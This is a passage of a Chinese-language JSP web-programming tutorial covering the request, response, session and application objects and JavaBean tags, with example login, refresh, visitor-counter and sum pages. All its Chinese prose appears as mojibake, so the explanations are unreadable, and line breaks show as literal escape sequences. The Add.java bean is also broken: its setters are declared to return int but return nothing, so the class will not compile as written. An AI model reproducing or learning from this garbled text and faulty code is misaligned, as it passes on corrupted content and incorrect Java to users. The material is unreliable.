request.getServerName() %><br>\n    æœåŠ¡å™¨ç«¯å£å·ï¼š <%= request.getServerPort() %><br>\n    æ¥å—å®¢æˆ·æäº¤ä¿¡æ¯çš„é¡µé¢ï¼š <%= request.getServletPath() %><br>\n</body>\n```\n\n![](https://img.jwt1399.top//img/20200607121131.png)\n\n### responseå¯¹è±¡çš„å¸¸ç”¨æ–¹æ³•ğŸš´â€â™€ï¸\n\n> ç”¨äºå“åº”å®¢æˆ·è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨å‘å®¢æˆ·ç«¯è¾“å‡ºä¿¡æ¯ã€‚å½“æœåŠ¡å™¨å‘å®¢æˆ·ç«¯ä¼ é€æ•°æ®æ—¶ï¼ŒJSPå®¹å™¨ä¼šè‡ªåŠ¨åˆ›å»ºresponseå¯¹è±¡å¹¶è¯·ä¿¡æ¯å°è£…åˆ°responseå¯¹è±¡ä¸­ï¼Œå½“JSPå®¹å™¨å¤„ç†å®Œè¯·æ±‚åï¼Œresponseå¯¹è±¡ä¼šè¢«é”€æ¯ã€‚responseå’Œrequestç»“åˆèµ·æ¥å®ŒæˆåŠ¨æ€ç½‘é¡µçš„äº¤äº’åŠŸèƒ½ã€‚\n\n| æ–¹æ³•                                                     | è¯´æ˜                                                         |\n| -------------------------------------------------------- | ------------------------------------------------------------ |\n| `SendRedirect(String                               url)` | `ä½¿ç”¨æŒ‡å®šçš„é‡å®šå‘ä½ç½®urlå‘å®¢æˆ·ç«¯å‘é€é‡å®šå‘å“åº”`              |\n| setDateHeader(String  name,long  date)                   | ä½¿ç”¨ç»™å®šçš„åç§°å’Œæ—¥æœŸå€¼è®¾ç½®ä¸€ä¸ªå“åº”æŠ¥å¤´ï¼Œ  å¦‚æœæŒ‡å®šçš„åç§°å·²ç»è®¾ç½®ï¼Œåˆ™æ–°å€¼ä¼šè¦†ç›–æ—§å€¼ |\n| `setHeader(String name,String value)`                    | `ä½¿ç”¨ç»™å®šçš„åç§°å’Œå€¼è®¾ç½®ä¸€ä¸ªå“åº”æŠ¥å¤´ï¼Œå¦‚æœæŒ‡å®šçš„åç§°å·²ç»è®¾ç½®ï¼Œåˆ™æ–°å€¼ä¼šè¦†ç›–æ—§å€¼` |\n| setHeader(String  name,int  value)                       | ä½¿ç”¨ç»™å®šçš„åç§°å’Œæ•´æ•°å€¼è®¾ç½®ä¸€ä¸ªå“åº”æŠ¥å¤´ï¼Œ  å¦‚æœæŒ‡å®šçš„åç§°å·²ç»è®¾ç½®ï¼Œåˆ™æ–°å€¼ä¼šè¦†ç›–æ—§å€¼ |\n| setContentType(String  type)                             | ä¸ºå“åº”è®¾ç½®å†…å®¹ç±»å‹ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ä¸ºtext/htmlï¼Œtext/plainï¼Œapplication/x_msexcelæˆ–application/msword |\n| setContentLength(int  len)                               | ä¸ºå“åº”è®¾ç½®å†…å®¹é•¿åº¦                                           |\n| setLocale(java.util.Locale loc)                          | ä¸ºå“åº”è®¾ç½®åœ°åŒºä¿¡æ¯                                           |\n\n#### é‡å®šå‘ç½‘é¡µ\n\n```java\nresponse.sendRedirect(\"url\");\n```\n\n**æ³¨æ„ï¼š**é‡å®šå‘`sendRedirect(String url)`å’Œè½¬å‘`<jsp:forward page=\" \"/>`çš„åŒºåˆ«ï¼š\n\nï¼ˆ1ï¼‰`<jsp:forward>`åªèƒ½åœ¨æœ¬ç½‘ç«™å†…è·³è½¬ï¼Œè€Œä½¿ç”¨`response.sendRedirect`å¯ä»¥è·³è½¬åˆ°ä»»ä½•ä¸€ä¸ªåœ°å€çš„é¡µé¢\n\nï¼ˆ2ï¼‰`<jsp:forward>`å¸¦ç€requestä¸­çš„ä¿¡æ¯è·³è½¬ï¼›sendRedirectä¸å¸¦requestä¿¡æ¯è·³è½¬ã€‚(æ­¤æ—¶ï¼Œå¯å€ŸåŠ©sessionå¯¹è±¡å­˜å–ä¿¡æ¯)\n\n**å®åˆ—ğŸŒ°**\n\n> `é¢˜ç›®ï¼š`ç”¨æˆ·åœ¨ç™»å½•ç•Œé¢ï¼ˆuserLogin.jspï¼‰è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œæäº¤åéªŒè¯ï¼ˆuserReceive.jspï¼‰ç™»å½•è€…è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®ï¼Œæ ¹æ®åˆ¤æ–­ç»“æœè½¬å‘ä¸åŒçš„é¡µé¢ï¼Œå½“è¾“å…¥çš„ç”¨æˆ·åæ˜¯â€œabcdefâ€ï¼Œå¯†ç ä¸ºâ€œ123456â€æ—¶è½¬å‘åˆ°ï¼ˆloginCorrect.jspï¼‰é¡µé¢ï¼Œå¹¶æ˜¾ç¤º â€œç”¨æˆ·ï¼šabcdefæˆåŠŸç™»å…¥!â€ ï¼Œå½“è¾“å…¥ä¿¡æ¯ä¸æ­£ç¡®ï¼Œé‡å®šä½åˆ°æœç‹ç½‘ç«™(`http://sohu.com`)ã€‚\n\n![](https://img.jwt1399.top//img/20200607123454.png) \n\n`userLogin.jsp`\n\n```html\n<form action=\"userReceive.jsp\" method=\"post\">\n        å§“ å: <input type=\"text\" name=\"RdName\"> <br>\n        å¯† ç : <input type=\"password\" name=\"RdPasswd\" > <br><br> \n        <input type=\"submit\" value=\"ç¡® å®š\" >\n</form>\n```\n\n`userReceive.jsp`\n\n```java\n<%\tString Name = request.getParameter(\"RdName\");\n\tString Passwd = request.getParameter(\"RdPasswd\");\n\tif (Name.equals(\"abcdef\") && Passwd.equals(\"123456\")){ %>\n    \t<jsp:forward page=\"loginCorrect.jsp\"/>\n    <%}else{\n    response.sendRedirect(\"http://sohu.com\");\n\t}%>\n```\n\n`loginCorrect.jsp`\n\n```java\n<% String Name = request.getParameter(\"RdName\"); %>\n æ¬¢è¿ï¼Œ<%=Name%>æˆåŠŸç™»å½•ï¼\n```\n\n#### é¡µé¢å®šæ—¶åˆ·æ–°æˆ–è‡ªåŠ¨è·³è½¬\n\n```java\n//æ¯éš”5ç§’ï¼Œé¡µé¢è‡ªåˆ·æ–°ä¸€æ¬¡\nresponse.setHeader(\"refresh\",\"5\");   \n\n//å»¶è¿Ÿ10ç§’åï¼Œè‡ªåŠ¨é‡å®šå‘åˆ°ç½‘é¡µhttp://www.sohu.com\nresponse.setHeader(\"refresh\",\"10;url=http://www.sohu.com\");\n```\n\n**å®åˆ—ğŸŒ°**\n\n> è®¾è®¡ä¸€ä¸ªJSPç¨‹åºï¼ˆtime.jspï¼‰ï¼Œæ¯é—´éš”1ç§’ï¼Œé¡µé¢è‡ªåŠ¨åˆ·æ–°ï¼Œå¹¶åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå½“å‰çš„æ—¶é—´ã€‚\n\n`time.jsp`\n\n```java\n<body>\nå½“å‰æ—¶é—´æ˜¯ï¼š<%=new Date().toLocaleString()%><br>\n<hr>\n<%response.setHeader(\"refresh\",\"1\");%> \n</body>\n```\n\n### sessionå¯¹è±¡çš„å¸¸ç”¨æ–¹æ³•ğŸ‹ï¸â€â™‚ï¸\n\n> JSPä¸ºæ¯ä¸€ç”¨æˆ·æä¾›äº†ä¸€ä¸ªsessionå¯¹è±¡åŠsession idï¼Œæ¥ä¿å­˜ç‰¹å®šæ—¶é—´å†…çš„ä¿¡æ¯ï¼ˆç³»ç»Ÿé»˜è®¤åœ¨30minå†…ï¼‰ï¼Œé™¤éç”¨æˆ·å…³é—­æµè§ˆå™¨ã€‚ä¸€æ—¦ç”¨æˆ·å…³é—­æµè§ˆå™¨æˆ–è¶…è¿‡æ—¶é™ï¼Œé‚£ä¹ˆç”¨æˆ·çš„sessionå¯¹è±¡å°†è¢«é”€æ¯ã€‚\n\n| æ–¹æ³•                                          | è¯´æ˜                                                         |\n| --------------------------------------------- | ------------------------------------------------------------ |\n| `Object getAttribute(String attriname)`       | ç”¨äºè·å–ä¸æŒ‡å®šåå­—ç›¸è”ç³»çš„å±æ€§  å¦‚æœå±æ€§ä¸å­˜åœ¨ï¼Œå°†ä¼šè¿”å›null |\n| `void setAttribute(String name,Object value)` | ç”¨äºè®¾å®šæŒ‡å®šåå­—çš„å±æ€§å€¼ï¼Œå¹¶ä¸”æŠŠå®ƒå­˜å‚¨åœ¨sessionå¯¹è±¡ä¸­        |\n| `void removeAttribute(String attriname)`      | ç”¨äºåˆ é™¤æŒ‡å®šçš„å±æ€§ï¼ˆåŒ…å«å±æ€§åã€å±æ€§å€¼ï¼‰                     |\n| Enumeration getAttributeNames()               | ç”¨äºè¿”å›sessionå¯¹è±¡ä¸­å­˜å‚¨çš„æ¯ä¸€ä¸ªå±æ€§å¯¹è±¡ï¼Œç»“æœé›†æ˜¯ä¸€ä¸ªEnumerationç±»çš„å®ä¾‹ |\n| long getCreationTime()                        | ç”¨äºè¿”å›sessionå¯¹è±¡è¢«åˆ›å»ºæ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’                    |\n| long getLastAccessedTime()                    | ç”¨äºè¿”å›sessionæœ€åå‘é€è¯·æ±‚çš„æ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’                |\n| String getId()                                | ç”¨äºè¿”å›Sessionå¯¹è±¡åœ¨æœåŠ¡å™¨ç«¯çš„ç¼–å·                          |\n| long getMaxInactiveInterval()                 | ç”¨äºè¿”å›sessionå¯¹è±¡çš„ç”Ÿå­˜æ—¶é—´ï¼Œå•ä½ä¸ºç§’                      |\n| `boolean isNew()`                             | ç”¨äºåˆ¤æ–­ç›®å‰sessionæ˜¯å¦ä¸ºæ–°çš„Sessionï¼Œè‹¥æ˜¯åˆ™è¿”å›tureï¼Œå¦åˆ™è¿”å›false |\n| `void invalidate()`                           | ç”¨äºé”€æ¯sessionå¯¹è±¡ï¼Œä½¿å¾—ä¸å…¶ç»‘å®šçš„å¯¹è±¡éƒ½æ— æ•ˆ                |\n\n#### åˆ›å»ºåŠè·å–å®¢æˆ·çš„ä¼šè¯\n\n```java\n//ç”¨äºæ˜¯è®¾ç½®æŒ‡å®šåç§°çš„å±æ€§å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨sessionå¯¹è±¡ä¸­\nsession.setAttribute(String name,String value);\n \n//è·å–ä¸æŒ‡å®šåå­—nameç›¸è”ç³»çš„å±æ€§\nsession.getAttribute(String name);\n\n```\n\n**å®åˆ—ğŸŒ°**\n\n> é€šè¿‡setAttribute()æ–¹æ³•å°†æ•°æ®ä¿å­˜åœ¨sessionä¸­ï¼Œå¹¶é€šè¿‡getAttribute()æ–¹æ³•å–å¾—æ•°æ®çš„å€¼ã€‚\n\n`index.jsp`\n\n```java\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%\nsession.setAttribute(\"information\",\"å‘sessionä¸­ä¿å­˜æ•°æ®\");\nresponse.sendRedirect(\"forward.jsp\");\n%>\n```\n\n`forward.jsp`\n\n```java\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<% out.print(session.getAttribute(\"information\"));%>\n```\n\n#### ä»ä¼šè¯ä¸­ç§»é™¤æŒ‡å®šçš„å¯¹è±¡\n\n```java\n//ä»è¿™ä¸ªä¼šè¯åˆ é™¤ä¸æŒ‡å®šåç§°ç»‘å®šçš„å¯¹è±¡ã€‚\nsession.removeAttribute (String name);\n```\n\n```java\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%\nsession.removeAttribute(\"information\");\nif (session.getAttribute(\"information\") == null) {\n\tout.print(\"sessionå¯¹è±¡informationå·²ç»ä¸å­˜åœ¨äº†\");\n}else{\n\tout.print(session.getAttribute(\"information\"));\n}\n%>\n```\n\n#### é”€æ¯session\n\n```java\n//å°†ä¼šè¯ä¸­çš„å…¨éƒ¨å†…å®¹åˆ é™¤\nsession.invalidate();\n```\n\n**sessionè¢«é”€æ¯çš„ä¸‰ç§æƒ…å†µï¼š**\n\n- 1.å®¢æˆ·ç«¯å…³é—­æµè§ˆå™¨\n- 2.Sessionè¿‡æœŸ\n- 3.æœåŠ¡å™¨ç«¯è°ƒç”¨äº†HttpSessionçš„invalidate()æ–¹æ³•ã€‚\n\n#### åˆ›å»ºåŠè·å–å®¢æˆ·çš„ä¼šè¯ä¿¡æ¯\n\n```java\n<%@page contentType=\"text/html\" pageEncoding=\"UTF-8\" import=\"java.util.*\"%>\n<html>\n    <head><title>åˆ©ç”¨sessionå¯¹è±¡è·å–ä¼šè¯ä¿¡æ¯å¹¶æ˜¾ç¤º</title> </head>\n    <body>\n       <hr>\n       sessionçš„åˆ›å»ºæ—¶é—´æ˜¯:<%=new Date(session.getCreationTime())%> <br>\n       sessionçš„Idå·:<%=session.getId()%><br>\n        å®¢æˆ·æœ€è¿‘ä¸€æ¬¡è®¿é—®æ—¶é—´æ˜¯:\n        <%=new java.sql.Time(session.getLastAccessedTime())%> <br>\n        ä¸¤æ¬¡è¯·æ±‚é—´éš”å¤šé•¿æ—¶é—´sessionå°†è¢«å–æ¶ˆ(ms):\n       <%=session.getMaxInactiveInterval()%> <br>\n        æ˜¯å¦æ˜¯æ–°åˆ›å»ºçš„session:<%=session.isNew()?\"æ˜¯\":\"å¦\"%>\n       <hr>\n    </body>\n</html>\n```\n\n### applicationå¯¹è±¡çš„å¸¸ç”¨æ–¹æ³•ğŸš£â€â™€ï¸\n\n> applicationå¯¹è±¡ç”¨äºä¿å­˜Webåº”ç”¨ç¨‹åºä¸­çš„å…¬æœ‰æ•°æ®ï¼Œåœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶å¯¹æ¯ä¸ªWebç¨‹åºéƒ½è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªapplicationå¯¹è±¡ï¼Œåªè¦ä¸å…³é—­æœåŠ¡å™¨ï¼Œapplicationå¯¹è±¡å°†ä¸€ç›´å­˜åœ¨ï¼Œæ‰€æœ‰è®¿é—®åŒä¸€å·¥ç¨‹çš„ç”¨æˆ·å¯ä»¥å…±äº«applicationå¯¹è±¡ã€‚\n\n| æ–¹æ³•                                                  | è¯´æ˜                                  |\n| ----------------------------------------------------- | ------------------------------------- |\n| Object getAttribute(String attriname)                 | è·å–æŒ‡å®šå±æ€§çš„å€¼ã€‚                    |\n| void setAttribute(String attriname,Object attrivalue) | è®¾ç½®ä¸€ä¸ªæ–°å±æ€§å¹¶ä¿å­˜å€¼ã€‚              |\n| void removeAttribute(String attriname)                | ä»applicationå¯¹è±¡ä¸­åˆ é™¤æŒ‡å®šçš„å±æ€§ã€‚   |\n| Enumeration getAttributeNames()                       | è·å–applicationå¯¹è±¡ä¸­æ‰€æœ‰å±æ€§çš„å½¢æˆã€‚ |\n\n**å®åˆ—ğŸŒ°**\n\n> `é¢˜ç›®ï¼š`åˆ©ç”¨applicationå¯¹è±¡çš„å±æ€§å­˜å‚¨ç»Ÿè®¡ç½‘ç«™è®¿é—®äººæ•°ã€‚\n\n```java\n\n <%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>\n<html>\n  <head>  <title>ç»Ÿè®¡ç½‘ç«™è®¿é—®äººæ•°åŠå…¶å½“å‰åœ¨çº¿äººæ•°</title> </head>  \n  <body>\n    <%! int number=0; %>\n        <% if(session.isNew()){//å¦‚æœæ˜¯ä¸€ä¸ªæ–°çš„ä¼šè¯\n        String numStr = (String)application.getAttribute(\"count\");\n        if(numStr == null){//å¦‚æœæ˜¯ç¬¬1ä¸ªè®¿é—®æœ¬ç«™\n             number=1;\n        }else{\n        number = Integer.parseInt(numStr)+1;\n        }\n        application.setAttribute(\"count\", number+\"\");\n        }\n    %>\n        æ¬¢è¿è®¿é—®æœ¬ç«™ï¼Œæ‚¨æ˜¯ç¬¬  <%=number%>ä¸ªè®¿é—®ç”¨æˆ·ã€‚\n  </body>\n</html>\n```\n\n## JavaBeanæŠ€æœ¯\n\n> JavaBeanæ˜¯Java Webç¨‹åºçš„é‡è¦ç»„ä»¶ï¼Œå®ƒæ˜¯ä¸€äº›å°è£…äº†æ•°æ®å’Œæ“ä½œçš„åŠŸèƒ½ç±»ï¼Œä¾›JSPæˆ–Servletè°ƒç”¨ï¼Œå®Œæˆæ•°æ®å°è£…å’Œæ•°æ®å¤„ç†ç­‰åŠŸèƒ½ã€‚\n\n### JavaBeançš„è®¾è®¡è§„åˆ™\n\n1ã€JavaBeanæ˜¯ä¸€ä¸ªå…¬å…±ç±»ã€‚\n\n2ã€JavaBeanç±»å…·æœ‰ä¸€ä¸ªå…¬å…±çš„æ— å‚çš„æ„é€ æ–¹æ³•ã€‚\n\n3ã€JavaBeanæ‰€æœ‰çš„å±æ€§å®šä¹‰ä¸ºç§æœ‰çš„ã€‚\n\n4ã€åœ¨JavaBeanä¸­ï¼Œéœ€è¦å¯¹æ¯ä¸ªå±æ€§æä¾›ä¸¤ä¸ªå…¬å…±æ–¹æ³•ã€‚å‡è®¾å±æ€§åå­—æ˜¯xxxï¼Œè¦æä¾›çš„ä¸¤ä¸ªæ–¹æ³•ï¼š\n\n-  setXxx()ï¼šç”¨æ¥è®¾ç½®å±æ€§xxxçš„å€¼ã€‚\n\n- getXxx()ï¼šç”¨æ¥è·å–å±æ€§xxxçš„å€¼(è‹¥å±æ€§ç±»å‹æ˜¯booleanï¼Œåˆ™æ–¹æ³•åä¸ºisXxx())ã€‚\n\n5ã€å®šä¹‰JavaBeanæ—¶ï¼Œé€šå¸¸æ”¾åœ¨ä¸€ä¸ªå‘½åçš„åŒ…ä¸‹ã€‚\n\n### JavaBeançš„å®‰è£…éƒ¨ç½²\n\n> è®¾è®¡çš„JavaBeanç±»ï¼Œç¼–è¯‘åï¼Œå¿…é¡»éƒ¨ç½²åˆ°Webåº”ç”¨ç¨‹åºä¸­æ‰èƒ½è¢«JSPæˆ–Servletè°ƒç”¨ã€‚\n\næœ‰ä¸‰ç§éƒ¨ç½²æ–¹å¼ï¼š\n\n1ã€å°†å•ä¸ªJavaBeanç±»ï¼Œéƒ¨ç½²åˆ°â€œå·¥ç¨‹åç§°/WEB-INF/classes/â€ä¸‹ã€‚\n\n2ã€JavaBeançš„æ‰“åŒ…ç±»Jarï¼Œéƒ¨ç½²åˆ°/WEB-INF/libä¸‹ã€‚\n\n3ã€åœ¨Eclipseå¼€å‘ç¯å¢ƒä¸­ï¼Œå½“éƒ¨ç½²Webå·¥ç¨‹æ—¶ï¼ŒJavaBeanä¼šè‡ªåŠ¨éƒ¨ç½²åˆ°æ­£ç¡®çš„ä½ç½®ã€‚è‹¥è®¾è®¡çš„JavaBeanè¢«ä¿®æ”¹ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²å·¥ç¨‹æ‰èƒ½ç”Ÿæ•ˆã€‚\n\n### JavaBeançš„JSPåŠ¨ä½œæ ‡ç­¾\n\n> åœ¨JSPé¡µé¢ä¸­ï¼Œå¯ä»¥é€šè¿‡è„šæœ¬ä»£ç ç›´æ¥è®¿é—®JavaBeanï¼Œä¹Ÿå¯ä»¥é€šè¿‡JSPåŠ¨ä½œæ ‡ç­¾æ¥è®¿é—®JavaBeanã€‚é‡‡ç”¨JSPåŠ¨ä½œæ ‡ç­¾ï¼Œå¯ä»¥å‡å°‘JSPç½‘é¡µä¸­çš„ç¨‹åºä»£ç ï¼Œä½¿å®ƒæ›´æ¥è¿‘äºHTMLé¡µé¢ã€‚\n\n- `<jsp:useBean>`ï¼šå£°æ˜å¹¶åˆ›å»ºJavaBeanå¯¹è±¡å®ä¾‹ã€‚\n\n- `<jsp:setProperty>`ï¼šå¯¹JavaBeanå¯¹è±¡çš„æŒ‡å®šå±æ€§è®¾ç½®å€¼ã€‚\n\n- `<jsp:getProperty>`ï¼šè·å–JavaBeanå¯¹è±¡æŒ‡å®šå±æ€§çš„å€¼ï¼Œå¹¶æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šã€‚\n\n#### `<jsp:useBean>`\n\nå£°æ˜JavaBeanå¯¹è±¡ï¼Œéœ€è¦ä½¿ç”¨`<jsp:useBean>`åŠ¨ä½œæ ‡ç­¾ã€‚\n\n**åŠŸèƒ½**ï¼šåœ¨æŒ‡å®šçš„ä½œç”¨èŒƒå›´å†…ï¼Œè°ƒç”¨ç”±classæ‰€æŒ‡å®šç±»çš„æ— å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡å®ä¾‹ã€‚è‹¥è¯¥å¯¹è±¡åœ¨è¯¥ä½œç”¨èŒƒå›´å†…å·²å­˜åœ¨ï¼Œåˆ™ä¸ç”Ÿæˆæ–°å¯¹è±¡ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨ã€‚\n\n  **å£°æ˜æ ¼å¼ï¼š**\n\n```java\n<jsp:useBean id=\"å¯¹è±¡å\" class= \"ç±»å\" scope= \"æœ‰æ•ˆèŒƒå›´\"/>\n```\n\n  **ä½¿ç”¨è¯´æ˜ï¼š**\n\n1ã€idå±æ€§ï¼šæŒ‡å®šæ‰€è¦åˆ›å»ºçš„å¯¹è±¡åç§°ã€‚\n\n2ã€classå±æ€§ï¼šç”¨æ¥æŒ‡å®šJavaBeançš„ç±»åï¼Œæ³¨æ„ï¼Œå¿…é¡»ä½¿ç”¨å®Œå…¨é™å®šç±»åã€‚\n\n3ã€scopeå±æ€§ï¼šæŒ‡å®šæ‰€åˆ›å»ºå¯¹è±¡çš„ä½œç”¨èŒƒå›´ï¼Œå…¶å–å€¼æœ‰å››ä¸ªï¼špageã€requestã€sessionã€applicationï¼Œé»˜è®¤å€¼æ˜¯pageã€‚åˆ†åˆ«è¡¨ç¤ºé¡µé¢ã€è¯·æ±‚ã€ä¼šè¯ã€åº”ç”¨å››ç§èŒƒå›´\n\n#### `<jsp:setProperty>`\n\nè®¾ç½®JavaBeanå±æ€§å€¼ï¼Œéœ€è¦ä½¿ç”¨`<jsp:useBean>`åŠ¨ä½œæ ‡ç­¾ã€‚\n\n**åŠŸèƒ½ï¼š**ä¸ºbeannameå¯¹è±¡çš„æŒ‡å®šå±æ€§propertynameè®¾ç½®æŒ‡å®šå€¼beanvalueã€‚\n\n  **å£°æ˜æ ¼å¼ï¼š**\n\n```java\n<jsp:setProperty  property=\"propertyname\" name=\"beanname\" value=\"beanvalue\"/>\n```\n\n  **ä½¿ç”¨è¯´æ˜ï¼š**\n\n1ã€propertyname ä»£è¡¨ JavaBeançš„å±æ€§åï¼›\n\n2ã€beanname ä»£è¡¨ JavaBeanå¯¹è±¡åï¼Œå¯¹åº”`<jsp:useBean>`æ ‡è®°çš„idå±æ€§\n\n3ã€beanvalueæ˜¯è¦è®¾ç½®çš„å€¼ã€‚åœ¨è®¾ç½®å€¼æ—¶ï¼Œè‡ªåŠ¨å®ç°ç±»å‹è½¬æ¢ï¼ˆå°†å­—ç¬¦ä¸²è‡ªåŠ¨è½¬æ¢ä¸ºJavaBeanä¸­å±æ€§æ‰€å£°æ˜çš„ç±»å‹ï¼‰ã€‚\n\n **4ç§è®¾ç½®æ–¹å¼**\n\n```html\n1.ç®€å•JavaBeanå±æ€§è®¾ç½®\n<jsp:setProperty name=\"beanname\" property=\"propertyname\" value=\"beanvalue\" />\nåŠŸèƒ½ï¼šä¸ºbeannameå¯¹è±¡çš„æŒ‡å®šå±æ€§propertynameè®¾ç½®æŒ‡å®šå€¼beanvalue\n\n2.å°†å•ä¸ªå±æ€§ä¸è¾“å…¥å‚æ•°ç›´æ¥å…³è”\n<jsp:setProperty name=\"beanname\" property=\"propertyname\" />\nåŠŸèƒ½ï¼šå°†å‚æ•°åç§°ä¸ºpropertynameçš„å€¼æäº¤ç»™åŒJavaBeanå±æ€§åç§°åŒåçš„å±æ€§ã€‚å¹¶è‡ªåŠ¨å®ç°æ•°æ®ç±»å‹è½¬æ¢\n\n3.å°†å•ä¸ªå±æ€§ä¸è¾“å…¥å‚æ•°é—´æ¥å…³è”\n<jsp:setProperty name=\"beanname\" property=\"propertyname\" param=\"bookName\" />\nåŠŸèƒ½ï¼šå°†è¯·æ±‚å‚æ•°åç§°ä¸ºparamnameçš„å€¼ç»™JavaBeançš„propertynameå±æ€§è®¾ç½®å±æ€§å€¼ã€‚\n\n\n4.å°†æ‰€æœ‰çš„å±æ€§ä¸è¯·æ±‚å‚æ•°å…³è”\n<jsp:setProperty name=\"beanname\" property=\"*\" />\nåŠŸèƒ½ï¼šå°†æäº¤é¡µé¢ä¸­è¡¨å•è¾“å…¥åŸŸæ‰€æä¾›çš„è¾“å…¥å€¼æäº¤åˆ°JavaBeanå¯¹è±¡ä¸­ç›¸åŒåç§°çš„å±æ€§ä¸­ã€‚\n```\n\n#### `<jsp:getProperty>`\n\næ˜¾ç¤ºJavaBeanå±æ€§å€¼ï¼Œéœ€è¦ä½¿ç”¨`<jsp:getProperty>`åŠ¨ä½œæ ‡ç­¾ã€‚\n\n**åŠŸèƒ½ï¼š**è·å–JavaBeanå¯¹è±¡æŒ‡å®šå±æ€§çš„å€¼ï¼Œå¹¶æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚\n\n  **å£°æ˜æ ¼å¼ï¼š**\n\n```java\n<jsp:getProperty  property=\"propertyname\"name=\"beanname\"/>\n```\n\n  **ä½¿ç”¨è¯´æ˜ï¼š**\n\n1ã€propertynameä»£è¡¨JavaBeançš„å±æ€§åï¼›\n\n2ã€beannameä»£è¡¨JavaBeanå¯¹è±¡åï¼Œå¯¹åº”`<jsp:useBean>`æ ‡è®°çš„idå±æ€§\n\n3ã€é€šè¿‡JavaBeanä¸­çš„getæ–¹æ³•è·å–å¯¹åº”å±æ€§çš„å€¼ã€‚\n\n### å®ä¾‹ğŸŒ°\n\n> `é¢˜ç›®ï¼š`è®¾è®¡Webç¨‹åºï¼Œè®¡ç®—ä»»æ„ä¸¤ä¸ªæ•´æ•°çš„å’Œå€¼ï¼Œå¹¶åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºç»“æœã€‚\n\n#### 1.ä½¿ç”¨è„šæœ¬ä»£ç \n\n`input.jsp`\n\n```html\n<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>\n<html>\n  <head> <title>input.jspæäº¤ä»»æ„2ä¸ªæ•´æ•°çš„é¡µé¢</title> </head>  \n  <body>\n  <h3> æŒ‰ä¸‹åˆ—æ ¼å¼è¦æ±‚ï¼Œè¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼š</h3><br>\n   <form action=\"show.jsp\" method=\"post\">\n         åŠ æ•°ï¼š<input name=\"shuju1\"><br><br>\n         è¢«åŠ æ•°ï¼š<input name=\"shuju2\"><br><br>\n         <input type=submit value=\"æäº¤\">\n   </form>\n  </body>\n</html>\n```\n\n`show.jsp`\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<html>\n  <head>  <title>åˆ©ç”¨JSPæ±‚ä¸¤æ•°å’Œ</title> </head>  \n  <body> \n     <% int shuju1 = Integer.parseInt(request.getParameter(\"shuju1\"));\n        int shuju2 = Integer.parseInt(request.getParameter(\"shuju2\"));\n     %>\n      <p>è°ƒç”¨requestè·å–æ•°æ®å¹¶è®¡ç®—å’Œæ˜¾ç¤ºï¼š<br>\n       <%=shuju1%>+<%=shuju2%>= <%=shuju1+shuju2%><br>\n     </p>\n  </body>\n</html>\n```\n\n#### 2.ä½¿ç”¨Javabean\n\nç½‘é¡µinput.jspæäº¤ä»»æ„ä¸¤ä¸ªæ•´æ•°ï¼Œè€Œç½‘é¡µshow.jspè·å–ä¸¤ä¸ªæ•°å€¼ååˆ›å»ºJavaBeanå¯¹è±¡ï¼Œå¹¶è°ƒç”¨æ±‚å’Œæ–¹æ³•è·å¾—å’Œå€¼ï¼Œç„¶åæ˜¾ç¤ºè®¡ç®—ç»“æœã€‚\n\n![](https://img.jwt1399.top//img/20200611194413.png)\n\n`input.jsp`\n\n```html\n<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>\n<html>\n  <head> <title>input.jspæäº¤ä»»æ„2ä¸ªæ•´æ•°çš„é¡µé¢</title> </head>  \n  <body>\n  <h3> æŒ‰ä¸‹åˆ—æ ¼å¼è¦æ±‚ï¼Œè¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼š</h3><br>\n   <form action=\"show.jsp\" method=\"post\">\n         åŠ æ•°ï¼š<input name=\"shuju1\"><br><br>\n         è¢«åŠ æ•°ï¼š<input name=\"shuju2\"><br><br>\n         <input type=submit value=\"æäº¤\">\n   </form>\n  </body>\n</html>\n```\n\n`Add.java`\n\n```java\npackage beans; //JavaBeanå¿…é¡»æ”¾åœ¨ä¸€ä¸ªç”¨æˆ·å‘½åçš„åŒ…ä¸‹\n\npublic class Add {\n\tprivate  int shuju1 ;\n\tprivate  int shuju2 ;\n\t\n\tpublic Add() {\n\t\tsuper();\n\t}\n\tpublic Add(int shuju1, int shuju2) {\n\t\tsuper();\n\t\tthis.shuju1 = shuju1;\n\t\tthis.shuju2 = shuju2;\n\t}\n\tpublic int getShuju1() {\n\t\treturn shuju1;\n\t}\n\tpublic int setShuju1(int shuju1) {\n\t\tthis.shuju1 = shuju1;\n\t}\n\tpublic int getShuju2() {\n\t\treturn shuju2;\n\t}\n\tpublic int setShuju2(int shuju2) {\n\t\tthis.shuju2 = shuju2;\n\t}\n\tpublic int sum(){\n        return shuju1+shuju2;\n    }\n\n```\n\n`show.jsp`\n\n```html\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<%@ page import=\"beans.Add\"  %> <%--å¯¼å…¥åŒ…--%>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<title>åˆ©ç”¨JSPæ±‚ä¸¤æ•°å’Œ</title>\n</head>\n<% 